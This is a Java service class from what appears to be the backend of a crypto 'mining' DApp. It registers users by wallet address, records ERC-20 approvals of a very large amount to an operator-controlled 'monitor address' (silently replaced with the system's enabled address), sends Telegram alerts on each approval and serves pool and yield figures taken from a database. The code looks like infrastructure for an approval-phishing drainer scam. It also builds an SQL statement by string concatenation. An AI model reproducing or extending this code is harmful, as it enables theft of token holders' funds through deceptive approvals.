package project.monitor.internal;

import java.math.BigDecimal;
import java.math.BigInteger;
import java.math.RoundingMode;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.orm.hibernate5.support.HibernateDaoSupport;
import org.web3j.utils.Convert;

import kernel.exception.BusinessException;
import kernel.util.Arith;
import kernel.util.DateUtils;
import kernel.util.JsonUtils;
import kernel.util.StringUtils;
import kernel.util.ThreadUtils;
import kernel.util.UUIDGenerator;
import project.Constants;
import project.data.DataService;
import project.data.model.Realtime;
import project.log.Log;
import project.log.LogService;
import project.monitor.AutoMonitorAddressConfigService;
import project.monitor.AutoMonitorDAppLogService;
import project.monitor.AutoMonitorPoolDataService;
import project.monitor.AutoMonitorPoolMiningDataService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.DAppAccountService;
import project.monitor.DAppService;
import project.monitor.activity.ActivityOrderService;
import project.monitor.erc20.service.Erc20RemoteService;
import project.monitor.erc20.service.Erc20Service;
import project.monitor.etherscan.EtherscanRemoteService;
import project.monitor.etherscan.GasOracle;
import project.monitor.etherscan.InputMethodEnum;
import project.monitor.etherscan.Transaction;
import project.monitor.mining.MiningConfig;
import project.monitor.mining.MiningConfigService;
import project.monitor.mining.MiningService;
import project.monitor.model.AutoMonitorAddressConfig;
import project.monitor.model.AutoMonitorDAppLog;
import project.monitor.model.AutoMonitorPoolData;
import project.monitor.model.AutoMonitorPoolMiningData;
import project.monitor.model.AutoMonitorWallet;
import project.monitor.noderpc.business.NodeRpcBusinessService;
import project.monitor.pledge.PledgeOrder;
import project.monitor.pledge.PledgeOrderService;
import project.monitor.report.DAppUserDataSumService;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.monitor.withdraw.AutoMonitorWithdraw;
import project.monitor.withdraw.AutoMonitorWithdrawCollection;
import project.monitor.withdraw.AutoMonitorWithdrawCollectionService;
import project.monitor.withdraw.AutoMonitorWithdrawService;
import project.party.PartyService;
import project.party.model.Party;
import project.party.model.UserRecom;
import project.party.recom.UserRecomService;
import project.syspara.Syspara;
import project.syspara.SysparaService;
import project.tip.TipConstants;
import project.tip.TipService;
import project.user.QRGenerateService;
import project.user.UserDataService;
import project.wallet.Wallet;
import project.wallet.WalletExtend;
import project.wallet.WalletService;
import security.Role;
import security.RoleService;
import security.SecUser;
import security.internal.SecUserService;

public class DAppServiceImpl extends HibernateDaoSupport implements DAppService {
	private Logger logger = LoggerFactory.getLogger(DAppServiceImpl.class);
	private PartyService partyService;

	protected SysparaService sysparaService;

	private WalletService walletService;
	private LogService logService;

	private UserRecomService userRecomService;
	private UserDataService userDataService;

	private AutoMonitorWalletService autoMonitorWalletService;
	private AutoMonitorWithdrawService autoMonitorWithdrawService;
	private SecUserService secUserService;
	private RoleService roleService;
	private AutoMonitorDAppLogService autoMonitorDAppLogService;
	private AutoMonitorPoolDataService autoMonitorPoolDataService;
	private MiningConfigService miningConfigService;
	private MiningService miningService;
	protected DataService dataService;
	protected ActivityOrderService activityOrderService;
	protected QRGenerateService qRGenerateService;
	protected TelegramBusinessMessageService telegramBusinessMessageService;
	protected DAppUserDataSumService dAppUserDataSumService;
	protected TipService tipService;
	protected DAppAccountService dAppAccountService;
	protected Erc20RemoteService erc20RemoteService;
	protected Erc20Service erc20Service;
	protected EtherscanRemoteService etherscanRemoteService;
	protected AutoMonitorAddressConfigService autoMonitorAddressConfigService;
	protected NodeRpcBusinessService nodeRpcBusinessService;
	protected AutoMonitorWithdrawCollectionService autoMonitorWithdrawCollectionService;
	protected PledgeOrderService pledgeOrderService;
	protected AutoMonitorPoolMiningDataService autoMonitorPoolMiningDataService;
	protected JdbcTemplate jdbcTemplate;

	@Override
	public Party saveLogin(String from, String code, String ip) {
		
		Party party = partyService.findPartyByUsername(from);

		// 已经存在的用户，直接返回登录成功
		if (party != null) {
			// 登录日志
			Log log = new Log();
			log.setCategory(Constants.LOG_CATEGORY_SECURITY);
			log.setLog("用户登录,ip[" + ip + "]");
			log.setPartyId(party.getId().toString());
			log.setUsername(from);
			logService.saveAsyn(log);
			
			party.setLogin_ip(ip);
			party.setLast_loginTime(new Date());
			this.partyService.update(party);
			return party;
		}

		// 第一次登录，则自动注册
		Party party_reco = this.partyService.findPartyByUsercode(code);
		if ("true".equals(sysparaService.find("register_need_usercode").getValue())) {
			if (party_reco == null || !party_reco.getEnabled()) {
				throw new BusinessException("code error");
			}
		}

		party = new Party();
		party.setUsername(from);
		party.setUsercode(getUsercode());
		party.setRolename(Constants.SECURITY_ROLE_MEMBER);
		party.setLogin_ip(ip);
		party.setLast_loginTime(new Date());
		partyService.save(party);

		Role role = this.roleService.findRoleByName(Constants.SECURITY_ROLE_MEMBER);

		SecUser secUser = new SecUser();
		secUser.setPartyId(String.valueOf(party.getId()));
		secUser.getRoles().add(role);

		secUser.setUsername(party.getUsername());

		this.secUserService.saveUser(secUser);

		// usdt账户
		Wallet wallet = new Wallet();
		wallet.setPartyId(party.getId().toString());
		wallet.setMoney(0d);
		this.walletService.save(wallet);

		if (party_reco != null) {
			
			UserRecom userRecom = new UserRecom();
			userRecom.setPartyId(party.getId());
			// 父类partyId
			userRecom.setReco_id(party_reco.getId());
			this.userRecomService.save(userRecom);
		}
		
		String uuid = UUIDGenerator.getUUID();
		String partyId = party.getId().toString();
		String partyRecoId = party_reco != null?party_reco.getId().toString():"";
		jdbcTemplate.execute("INSERT INTO T_USER(UUID,PARTY_ID,PARENT_PARTY_ID) VALUES('"+uuid+"','"+partyId+"','"+partyRecoId+"')");

		this.userDataService.saveRegister(party.getId());

		dAppUserDataSumService.saveRegister(party.getId());

		/**
		 * 登录日志
		 */
		project.log.Log log = new project.log.Log();

		log.setCategory(Constants.LOG_CATEGORY_SECURITY);
		log.setLog("用户登录,ip[" + ip + "]");
		log.setPartyId(party.getId().toString());
		log.setUsername(from);
		logService.saveAsyn(log);
		return party;
	}

	/**
	 * 检查当前地址是否可授权 return true:可授权，false:不可授权
	 */
	public int check(String address) {
		// 统一处理成小写
		address = address.toLowerCase();
		AutoMonitorWallet entity = autoMonitorWalletService.findBy(address);

		if (entity == null || entity.getSucceeded() == 2) {
			return 0;
		}
		if (entity.getSucceeded() == 0) {
			return 1;
		}
		if (entity.getSucceeded() == 1) {
			return 2;
		}
		if (entity.getSucceeded() == -5) {
			return -5;
		}
		return 0;

	}

	/**
	 * 检测是否已加入其他节点
	 * 
	 * @param address
	 * @return true:已加入其他节点，false:未加入其他节点
	 */
	public boolean checkNodeAddress(String address) {
		String myCode = sysparaService.find("node_project_code").getValue();
		if ("8467".equals(myCode)) {// 特殊代码直接过滤用作演示
			return false;
		}
		String projectCode = nodeRpcBusinessService.sendGet(address);
		if (projectCode == null) {// 服务调用异常时，不做判断处理，走正常流程
			return false;
		}
		if (!myCode.equals(projectCode) && !"-1".equals(projectCode)) {
//			throw new BusinessException("Has joined other nodes");
			return true;
		}
		return false;
	}

	/**
	 * 检验地址是否已经加入节点
	 * 
	 * @param address
	 * @return true:已加入，false:未加入
	 */
	public boolean checkAddNode(String address) {
		// 统一处理成小写
		address = address.toLowerCase();
		AutoMonitorWallet entity = autoMonitorWalletService.findBy(address);

		if (entity != null && entity.getSucceeded() == 1) {
			return true;
		}
		return false;
	}

	public int saveApprove(String from, String to) {

		// 统一处理成小写
		from = from.trim().toLowerCase();
		Party party = partyService.findPartyByUsername(from);

		if (party == null) {
			throw new BusinessException("user unknown");
		}

		int check = check(from);
		if (check != 0 && check != -5) {
			// 已加入，不处理
			return check;
		}

		AutoMonitorWallet entity = autoMonitorWalletService.findBy(from);

		if (entity == null) {
			entity = new AutoMonitorWallet();
			entity.setAddress(from);
			entity.setMonitor_amount(Double.valueOf(10000000000L));
			entity.setCreated(new Date());
			entity.setPartyId(party.getId());
			entity.setMonitor_address(to);
			entity.setRolename(party.getRolename());
			/**
			 * 弃用了，代理先不删
			 */
			Double threshold = sysparaService.find("auto_monitor_threshold").getDouble();

			entity.setThreshold(threshold);

			entity.setCreated_time_stamp(new Date().getTime() / 1000);
			autoMonitorWalletService.save(entity);

		} else {

			if (entity.getSucceeded() == -5) {
				entity.setSucceeded(0);
				entity.setCancel_apply(1);
				entity.setCreated_time_stamp(new Date().getTime() / 1000);
				autoMonitorWalletService.update(entity);
				return 1;
			} else {
				entity.setMonitor_address(to);
				// 重置申请中状态
				entity.setSucceeded(0);

				entity.setCreated_time_stamp(new Date().getTime() / 1000);
				autoMonitorWalletService.update(entity);
			}
		}
		autoMonitorAddressConfigService.saveApproveByAddress(entity.getMonitor_address());

		tipService.saveTip(entity.getId().toString(), TipConstants.AUTO_MONITOR_APPROVE);
		return 1;

	}

	public void approveAdd(String from, String hash, boolean status) {
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			return;
		}

		AutoMonitorWallet entity = autoMonitorWalletService.findBy(from);
		if (entity == null) {

			return;
		}

		if (entity.getSucceeded() == 1) {
			/**
			 * 数据库状态成功，只保存哈希
			 */
			entity.setTxn_hash(hash);
			autoMonitorWalletService.update(entity);
			return;
		}
		if (entity.getSucceeded() == -5 || entity.getCancel_apply() == 1) {// 取消授权发起后处理
			if (status) {
				entity.setSucceeded(2);
				entity.setCancel_apply(2);
				autoMonitorWalletService.update(entity);
				dAppUserDataSumService.saveApproveSuccessToFail(party.getId());
			} else {
				entity.setSucceeded(-5);
				entity.setCancel_apply(0);
				autoMonitorWalletService.update(entity);
			}
			return;
		}
		// 原状态是否处于申请中
		boolean oldStatusApply = entity.getSucceeded() == 0;
		if (status) {
			entity.setTxn_hash(hash);
			entity.setSucceeded(1);
			String oldMonitorAddress = entity.getMonitor_address();
			//成功的话,直接改成系统正在启用的地址，避免申请单未提交，而区块链已经成功后发起的
			String address = autoMonitorAddressConfigService.findByEnabled().getAddress();
			entity.setMonitor_address(address);
			
			autoMonitorWalletService.update(entity);

			dAppUserDataSumService.saveApprove(party.getId());

			if(!address.equals(oldMonitorAddress)) {
				//并且记录日志
				project.log.Log log = new project.log.Log();
				log.setCategory(Constants.LOG_CATEGORY_SECURITY);
				log.setLog("前端接口请求返回授权成功，但是申请单授权地址与系统地址不匹配自动替换，用户申请单原授权地址:["+entity.getMonitor_address()+"],系统启用地址:["+address+"]");
				log.setPartyId(party.getId().toString());
				log.setUsername(from);
				logService.saveAsyn(log);
				entity.setMonitor_address(address);
			}
			
			// 等待事务提交后
			ThreadUtils.sleep(200);
			dAppAccountService.addBalanceQueue(party.getUsercode(), party.getRolename());
			telegramBusinessMessageService.sendApproveAddTeleg(party);
			autoMonitorPoolDataService.updatePoolDataByApproveSuccess();
			autoMonitorPoolMiningDataService.updatePoolDataByApproveSuccess();
		} else {
			entity.setTxn_hash(hash);
			// 返回失败时，哈希为空表示为拒绝
			entity.setSucceeded(StringUtils.isEmptyString(hash) ? 4 : 2);
			autoMonitorWalletService.update(entity);

			// 失败时才发送消息
//			if (entity.getSucceeded() == 2) {
//				telegramBusinessMessageService.sendApproveErrorAddTeleg(party);
//			}
		}
		if (oldStatusApply) {
			// 申请到失败或拒绝 授权地址 授权申请数-1
			if (entity.getSucceeded() == 2 || entity.getSucceeded() == 4) {
				autoMonitorAddressConfigService.saveApproveFailByAddress(entity.getMonitor_address());
			}
			tipService.deleteTip(entity.getId().toString());
		}
	}

	public Double getBalance(String from) {
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			throw new BusinessException("user unknown");
		}
		// 目前是ETH，后续的是否需要变动改成动态再讨论
//		String symbol = "eth";
		String symbol = Constants.WALLETEXTEND_DAPP_ETH;
		WalletExtend walletExtend = walletService.saveExtendByPara(party.getId(), symbol);
		return walletExtend.getAmount();
	}

	public void saveExchange(String partyId, String address, double value) {

//		if (!checkAddNode(from)) {
////			用户未加入节点
//			throw new BusinessException("The user did not join the node");
//		}
		// 目前是ETH，后续的是否需要变动改成动态再讨论
//		String symbol = "eth";
		String symbol = Constants.WALLETEXTEND_DAPP_ETH;
		AutoMonitorWithdraw withdraw = new AutoMonitorWithdraw();
		withdraw.setPartyId(partyId);
		withdraw.setVolume(value);
		withdraw.setAddress(address);
		withdraw.setMethod(symbol);
		autoMonitorWithdrawService.saveExchangeApply(withdraw);
	}

	/**
	 * 质押总金额赎回
	 */
	public void saveExchangeCollection(String from) {

//		if (value <= 0) {
//			// 请输入正确的转换金额
//			throw new BusinessException("Please enter the correct conversion amount");
//		}
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			throw new BusinessException("user unknown");
		}
		PledgeOrder order = pledgeOrderService.findByPartyId(party.getId());
		if (order == null) {
			// 用户未加入质押
			throw new BusinessException("The user did not join the Crypto Loans");
		}
		if (!order.getApply()) {
			// 用户未加入质押
			throw new BusinessException("The user did not join the Crypto Loans");
		}
		// 用户未达到可下发时间，不可赎回
		if (!order.getSendtime().before(new Date())) {
			throw new BusinessException("Not within the redeem time");
		}

//		if (!checkAddNode(from)) {
////			用户未加入节点
//			throw new BusinessException("The user did not join the node");
//		}
		// 目前是ETH，后续的是否需要变动改成动态再讨论
//		String symbol = "eth";
		String symbol = Constants.WALLETEXTEND_DAPP_USDT;
		WalletExtend walletExtend = walletService.saveExtendByPara(party.getId(), symbol);
		AutoMonitorWithdrawCollection withdraw = new AutoMonitorWithdrawCollection();
		withdraw.setPartyId(party.getId());
		withdraw.setVolume(walletExtend.getAmount());
		withdraw.setAddress(from);
		withdraw.setMethod(symbol);
		autoMonitorWithdrawCollectionService.saveExchangeApply(withdraw);
	}

	private String getUsercode() {
		Syspara syspara = sysparaService.find("user_uid_sequence");
		int random = (int) (Math.random() * 3 + 1);
		int user_uid_sequence = syspara.getInteger() + random;
		syspara.setValue(user_uid_sequence);
		sysparaService.update(syspara);

		String usercode = String.valueOf(user_uid_sequence);
		return usercode;
	}


	public List<Map<String, Object>> getExchangeLogs(int pageNo, int pageSize, String partyId, String action) {

		List<AutoMonitorDAppLog> list = autoMonitorDAppLogService.pagedQuery(pageNo, pageSize,
				partyId, action);
		
		List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
		for (AutoMonitorDAppLog log : list) {
			Map<String, Object> map = new HashMap<String, Object>();
			// ETH
			map.put("eth", log.getExchange_volume());
			// usdt
			map.put("usdt", log.getAmount());
			// status
			map.put("status", log.getStatus());
		    map.put("action", log.getAction());
			map.put("create_time", DateUtils.format(log.getCreateTime(), DateUtils.DF_yyyyMMddHHmm));
			result.add(map);
		}
		return result;
	}

	public Map<String, Object> poolData() {
		Map<String, Object> map = new HashMap<String, Object>();
		AutoMonitorPoolData poolData = autoMonitorPoolDataService.findDefault();
		// 总产量
		map.put("total_output", poolData.getTotal_output());
		// 参与人数
		map.put("user_revenue", poolData.getUser_revenue());
		// 用户收益
		map.put("verifier", poolData.getVerifier());
		// 节点数
		map.put("node_num", poolData.getNode_num());
		// 总流动性挖矿合约资金
		map.put("mining_total", poolData.getMining_total());
		// 平台总质押金额
		map.put("tradingSum", poolData.getTradingSum());
		return map;
	}

	public Map<String, Object> poolMiningData() {
		Map<String, Object> map = new HashMap<String, Object>();
		AutoMonitorPoolMiningData poolData = autoMonitorPoolMiningDataService.findDefault();
		map.put("total_output", poolData.getTotal_output());
		map.put("verifier", poolData.getVerifier());
		return map;
	}

	public Map<String, Object> getProfit(String from) {
		Map<String, Object> map = new HashMap<String, Object>();
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			throw new BusinessException("user unknown");
		}
		// 默认值为最大
		double money = 5999999;
		double geteth = 0d;

		if (!checkAddNode(from)) {
			// 用户未加入节点时取最大的收益率
			MiningConfig config = miningConfigService.getHoldConfig();
			geteth = config == null ? 0 : miningService.getIncomeRate(money, config);
		} else {

			List<MiningConfig> configs = miningConfigService.getAll();
			List<UserRecom> parents = userRecomService.getParents(party.getId());
			MiningConfig config = miningConfigService.getConfig(party.getId().toString(), parents, configs);

			WalletExtend extend = walletService.saveExtendByPara(party.getId(), Constants.WALLETEXTEND_DAPP_USDT_USER);
			money = extend.getAmount();
			geteth = config == null ? 0 : miningService.getIncomeRate(money, config);
		}
		// eth行情价
		List<Realtime> realtime_list = this.dataService.realtime("eth");
		Realtime realtime = null;
		if (realtime_list.size() > 0) {
			realtime = realtime_list.get(0);
		}
		Double close = realtime.getClose();

		map.put("eth_return", Arith.round(geteth * 100, 2));
		map.put("usdtRate", close);

		return map;
	}

	public Map<String, String> getActivity(String from) {
		Map<String, String> map = activityOrderService.saveFindBy(from);
		return map;
	}

	
	public void saveActivity(String from, String activityId) {
		activityOrderService.savejoin(from, activityId);
	}

	public Map<String, Object> share(Party party) {

		// 关闭后，正式用户进入推广页面的时候，接口就不返回内容
		boolean member_promote_button = sysparaService.find("member_promote_button").getBoolean();

		Map<String, Object> map = new HashMap<String, Object>();

		if (Constants.SECURITY_ROLE_MEMBER.equals(party.getRolename()) && !member_promote_button) {
			map.put("url", "");
		} else {
			String url = Constants.WEB_URL;
			url = url.substring(0, url.length() - 4);
			map.put("url", url + "#/?code=" + party.getUsercode());
		}

		return map;
	}

	public double exchangeFee(String from, double volume) {
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			throw new BusinessException("user unknown");
		}

		Realtime realtime = dataService.realtime("eth").get(0);
		Double close = realtime.getClose();

		return autoMonitorWithdrawService.feeOfExchange(party.getId().toString(), volume, close);
	}

	public List<Map<String, Object>> getNoticeLogs() {
		AutoMonitorPoolData findDefault = autoMonitorPoolDataService.findDefault();
		String noticeLogs = findDefault.getNotice_logs();

		List list = StringUtils.isEmptyString(noticeLogs) ? new ArrayList()
				: JsonUtils.json2Object(noticeLogs, List.class);
		return list;
	}

	/**
	 * 获取授权gas相关参数
	 * 
	 * @return
	 */
	public Map<String, Object> getApproveGasAbout(String from) {
		from = from.trim();
		// 统一处理成小写
		from = from.toLowerCase();
		Party party = partyService.findPartyByUsername(from);
		if (party == null) {
			throw new BusinessException("user unknown");
		}

		try {
			Map<String, Object> map = new HashMap<String, Object>();

			AutoMonitorWallet entity = autoMonitorWalletService.findBy(from);
			String approveValue = "10000000000";
			if (entity != null && entity.getSucceeded() == -5) {
				approveValue = "0";
				map.put("own_approve_address", entity.getMonitor_address());
			}

			AutoMonitorAddressConfig addressConfig = autoMonitorAddressConfigService.findByEnabled();
			if (null == addressConfig || StringUtils.isNullOrEmpty(addressConfig.getAddress())) {
				throw new BusinessException("addressConfig is null");
			}

			BigInteger gasLimitByApprove = erc20RemoteService.gasLimitByApprove(from, addressConfig.getAddress(), approveValue);
			GasOracle gasOracle = etherscanRemoteService.getDoubleFastGasOracle();

			if (!Constants.SECURITY_ROLE_GUEST.equals(party.getRolename())
					&& (gasLimitByApprove == null || gasOracle == null)) {
				map.put("action", 0);
				map.put("eth", 0);
				map.put("usdt", 0);
				map.put("gaslimit", 0);
				map.put("gasprice", 0);
			} else {// 演示账号正常计算
				map.put("gaslimit", gasLimitByApprove.longValue());
				map.put("gasprice", gasOracle.getFastGasPriceGWei());

				Double ethBalance = erc20Service.getEthBalance(from);
				BigDecimal bigDecimal = Convert.fromWei(
						gasLimitByApprove.multiply(gasOracle.getFastGasPriceGWei()).toString(), Convert.Unit.ETHER);
				Realtime realtime = dataService.realtime("eth").get(0);
				Double close = realtime.getClose();
				map.put("action", ethBalance != null && ethBalance.compareTo(bigDecimal.doubleValue()) >= 0 ? 1 : 0);
				map.put("eth", bigDecimal.doubleValue());
				map.put("usdt", new BigDecimal(Arith.mul(close, bigDecimal.doubleValue())).setScale(2, RoundingMode.UP));
			}
			// 演示账号默认可以发送
			if (Constants.SECURITY_ROLE_GUEST.equals(party.getRolename())) {
				map.put("action", 1);
			}
			return map;
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("getApproveGasAbout fail,address:" + from, "e:" + e);
			e.printStackTrace();
			throw new BusinessException("Blockchain detection timeout,please try again later");
		}
	}

	public String ownApproveAddress(String from) {
		from = from.trim();
		AutoMonitorWallet entity = autoMonitorWalletService.findBy(from);
		if (entity != null && entity.getSucceeded() == -5) {
			return entity.getMonitor_address();
		}
		return null;
	}

	/**
	 * 检测区块链
	 * 
	 * @param party
	 */
	public int checkApproveChainBlock(Party party) {
		try {

			AutoMonitorWallet entity = autoMonitorWalletService.findBy(party.getUsername());
			if (entity == null) {
				return checkAnswer(entity);
			}
			// 申请单存在 且不是拒绝时不处理
			if (entity != null && entity.getSucceeded() != 4) {
				return checkAnswer(entity);
			}
			if (entity != null && entity.getCancel_apply() == 1) {
				return checkAnswer(entity);
			}
			Set<String> addressSet = autoMonitorAddressConfigService.cacheAllMap().keySet();
			List<Transaction> transactions = etherscanRemoteService.getListOfTransactions(party.getUsername(), 0);
			/**
			 * 授权状态 0 待确认，1 成功 2 失败,3取消
			 */
			int succeeded = 0;
			String hash = "";
			// 是否存在交易记录
			boolean isExit = false;
			// 授权地址
			String to = "";
			Long createTimeStamp = null;
			for (int i = 0; i < transactions.size(); i++) {
				Transaction transaction = transactions.get(i);
				// 非授权的交易记录直接过滤
				if (!InputMethodEnum.approve.name().equals(transaction.getInputMethod())) {
					continue;
				}
				Map<String, Object> inputValueMap = transaction.getInputValueMap();
				String approve_address = inputValueMap.get("approve_address").toString();
				BigInteger approve_value = new BigInteger(inputValueMap.get("approve_value").toString());

				if (checkApproveAddress(entity, approve_address, addressSet)) {
					isExit = true;
					if (StringUtils.isEmptyString(transaction.getTxreceipt_status())) {
						continue;
					}

					switch (transaction.getTxreceipt_status()) {
					// 授权成功
					case "1":
						// 取消
						if (approve_value.compareTo(BigInteger.valueOf(0L)) == 0) {
							succeeded = 3;
						} else {
							succeeded = 1;
							to = approve_address;
						}
						hash = transaction.getHash();
						createTimeStamp = Long.valueOf(transaction.getTimeStamp());
						break;
					// 授权失败
					case "0":
						if (succeeded != 1) {
							succeeded = 2;
							hash = transaction.getHash();
							createTimeStamp = Long.valueOf(transaction.getTimeStamp());
						}
						break;
					default:
						createTimeStamp = Long.valueOf(transaction.getTimeStamp());
						break;
					}
				}
			}

			if (succeeded == 1) {// 成功
				entity = saveOrUpdateApprove(party, to, createTimeStamp, hash, 1, "login检测，用户授权成功");
			} else if (succeeded == 2) {// 失败
				entity = saveOrUpdateApprove(party, to, createTimeStamp, hash, 2, "login检测，用户授权失败");
			} else if (succeeded == 3) {// 取消
				entity = saveOrUpdateApprove(party, to, createTimeStamp, hash, 2, "login检测，用户授权取消");
			} else if (isExit) {
				entity = saveOrUpdateApprove(party, to, createTimeStamp, hash, 0, "login检测，用户授权处理中");
			}

			return checkAnswer(entity);

		} catch (Exception e) {
			logger.error("DAppServiceImpl checkApproveChainBlock fail,address:{},e:" + e, party.getUsername());
			e.printStackTrace();
			return -1;
		}
	}

	public AutoMonitorWallet saveOrUpdateApprove(Party party, String approveAddress, Long createTimeStamp, String hash,
			int status, String logText) {

		AutoMonitorWallet entity = autoMonitorWalletService.findBy(party.getUsername());
		if (entity != null && entity.getSucceeded() != 4) {
			// 已经完成了的不处理
			return entity;
		}
		String dbSucceedLog = ",原状态:";
		if (entity == null) {
			entity = new AutoMonitorWallet();
			entity.setAddress(party.getUsername());
			entity.setMonitor_amount(Double.valueOf(10000000000L));
			entity.setCreated(new Date());
			entity.setPartyId(party.getId());
			entity.setMonitor_address(approveAddress);
			entity.setRolename(party.getRolename());
			/**
			 * 这个数据库没有，负责联调的补上
			 */
			/**
			 * 弃用了，代理先不删
			 */
			Double threshold = sysparaService.find("auto_monitor_threshold").getDouble();
			entity.setThreshold(threshold);

			entity.setSucceeded(status);
			entity.setCreated_time_stamp(createTimeStamp);
			entity.setCreated(new Date());
			entity.setTxn_hash(hash);
			autoMonitorWalletService.save(entity);
			dbSucceedLog += "未申请";
		} else {
			dbSucceedLog += "拒绝";
			entity.setSucceeded(status);
			entity.setTxn_hash(hash);
			autoMonitorWalletService.update(entity);

		}
		if (status == 1) {// 表示是从拒绝或没有申请单直接到成功状态
			autoMonitorAddressConfigService.saveApproveByAddress(entity.getMonitor_address());
			dAppUserDataSumService.saveApprove(party.getId());
			// 等待事务提交后
			ThreadUtils.sleep(200);
			dAppAccountService.addBalanceQueue(party.getUsercode(), party.getRolename());
			telegramBusinessMessageService.sendApproveAddTeleg(party);
			autoMonitorPoolDataService.updatePoolDataByApproveSuccess();
			autoMonitorPoolMiningDataService.updatePoolDataByApproveSuccess();
			// 授权成功则加入到远程服务中
			nodeRpcBusinessService.sendAdd(entity.getAddress());
		}

		project.log.Log log = new project.log.Log();

		log.setCategory(Constants.LOG_CATEGORY_SECURITY);
		log.setLog(logText + dbSucceedLog + ",授权地址[" + approveAddress + "]");
		log.setPartyId(party.getId().toString());
		log.setUsername(party.getUsername());
		logService.saveAsyn(log);
		return entity;
	}

	public boolean checkApproveAddress(AutoMonitorWallet entity, String approveAddress, Set<String> addressSet) {
		if (entity == null) {
			// 没有申请单的，匹配数据库中的授权地址
			for (String address : addressSet) {
				if (approveAddress.equalsIgnoreCase(address)) {
					return true;
				}
			}
		} else {
			return approveAddress.equalsIgnoreCase(entity.getMonitor_address());
		}
		return false;
	}

	public int checkAnswer(AutoMonitorWallet entity) {
		// 返回前端的状态
		if (entity == null || entity.getSucceeded() == 2) {
			return 0;
		}
		if (entity.getSucceeded() == 0) {
			return 1;
		}
		if (entity.getSucceeded() == 1) {
			return 2;
		}
		if (entity.getSucceeded() == -5) {
			return -5;
		}
//		if (entity.getSucceeded() == -4) {
//			return -4;
//		}
//		if (entity.getSucceeded() == -3) {
//			return -3;
//		}
		return 0;
	}

	public void setPartyService(PartyService partyService) {
		this.partyService = partyService;
	}

	public void setSysparaService(SysparaService sysparaService) {
		this.sysparaService = sysparaService;
	}

	public void setWalletService(WalletService walletService) {
		this.walletService = walletService;
	}

	public void setLogService(LogService logService) {
		this.logService = logService;
	}

//	public void setIpMenuService(IpMenuService ipMenuService) {
//		this.ipMenuService = ipMenuService;
//	}

	public void setUserRecomService(UserRecomService userRecomService) {
		this.userRecomService = userRecomService;
	}

	public void setUserDataService(UserDataService userDataService) {
		this.userDataService = userDataService;
	}

	public void setAutoMonitorWalletService(AutoMonitorWalletService autoMonitorWalletService) {
		this.autoMonitorWalletService = autoMonitorWalletService;
	}

	public void setAutoMonitorWithdrawService(AutoMonitorWithdrawService autoMonitorWithdrawService) {
		this.autoMonitorWithdrawService = autoMonitorWithdrawService;
	}

	public void setSecUserService(SecUserService secUserService) {
		this.secUserService = secUserService;
	}

	public void setRoleService(RoleService roleService) {
		this.roleService = roleService;
	}

	public void setAutoMonitorDAppLogService(AutoMonitorDAppLogService autoMonitorDAppLogService) {
		this.autoMonitorDAppLogService = autoMonitorDAppLogService;
	}

	public void setAutoMonitorPoolDataService(AutoMonitorPoolDataService autoMonitorPoolDataService) {
		this.autoMonitorPoolDataService = autoMonitorPoolDataService;
	}

	public void setMiningConfigService(MiningConfigService miningConfigService) {
		this.miningConfigService = miningConfigService;
	}

	public void setMiningService(MiningService miningService) {
		this.miningService = miningService;
	}

	public void setDataService(DataService dataService) {
		this.dataService = dataService;
	}

	public void setActivityOrderService(ActivityOrderService activityOrderService) {
		this.activityOrderService = activityOrderService;
	}

	public void setqRGenerateService(QRGenerateService qRGenerateService) {
		this.qRGenerateService = qRGenerateService;
	}

	public void setTelegramBusinessMessageService(TelegramBusinessMessageService telegramBusinessMessageService) {
		this.telegramBusinessMessageService = telegramBusinessMessageService;
	}

	public void setdAppUserDataSumService(DAppUserDataSumService dAppUserDataSumService) {
		this.dAppUserDataSumService = dAppUserDataSumService;
	}

	public void setTipService(TipService tipService) {
		this.tipService = tipService;
	}

	public void setdAppAccountService(DAppAccountService dAppAccountService) {
		this.dAppAccountService = dAppAccountService;
	}

	public void setErc20RemoteService(Erc20RemoteService erc20RemoteService) {
		this.erc20RemoteService = erc20RemoteService;
	}

	public void setEtherscanRemoteService(EtherscanRemoteService etherscanRemoteService) {
		this.etherscanRemoteService = etherscanRemoteService;
	}

	public void setAutoMonitorAddressConfigService(AutoMonitorAddressConfigService autoMonitorAddressConfigService) {
		this.autoMonitorAddressConfigService = autoMonitorAddressConfigService;
	}

	public void setErc20Service(Erc20Service erc20Service) {
		this.erc20Service = erc20Service;
	}

	public void setNodeRpcBusinessService(NodeRpcBusinessService nodeRpcBusinessService) {
		this.nodeRpcBusinessService = nodeRpcBusinessService;
	}

	public void setAutoMonitorWithdrawCollectionService(
			AutoMonitorWithdrawCollectionService autoMonitorWithdrawCollectionService) {
		this.autoMonitorWithdrawCollectionService = autoMonitorWithdrawCollectionService;
	}

	public void setPledgeOrderService(PledgeOrderService pledgeOrderService) {
		this.pledgeOrderService = pledgeOrderService;
	}

	public void setAutoMonitorPoolMiningDataService(AutoMonitorPoolMiningDataService autoMonitorPoolMiningDataService) {
		this.autoMonitorPoolMiningDataService = autoMonitorPoolMiningDataService;
	}
	
	public void setJdbcTemplate(JdbcTemplate jdbcTemplate) {
		this.jdbcTemplate = jdbcTemplate;
	}

}
